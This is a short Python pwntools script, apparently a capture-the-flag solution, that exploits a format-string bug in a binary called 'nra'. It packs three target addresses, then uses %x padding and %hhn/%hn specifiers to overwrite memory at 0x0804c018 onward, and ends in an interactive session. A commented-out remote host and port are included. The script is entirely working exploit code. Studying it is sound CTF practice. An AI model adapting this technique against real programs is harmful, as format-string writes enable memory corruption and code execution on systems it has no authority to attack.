from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = 'amd64'
target = process('./nra')
#target = remote('95.216.233.106', 27436)

#gdb.attach(target)
print target.recvline()

flag_adr0 = p32(0x0804c018)
flag_adr1 = p32(0x0804c019)
flag_adr3 = p32(0x0804c01a)

offset_val0 = "%57x"
offset_val1 = "%77x"
offset_val2 = "%1906x"

fmt_string0 = "%4$hhn"
fmt_string1 = "%5$hhn"
fmt_string2 = "%6$hn"

payload = flag_adr0 + flag_adr1 + flag_adr3 + offset_val0 + fmt_string0 + offset_val1 + fmt_string1 + offset_val2 + fmt_string2

target.sendline(payload)
target.interactive()
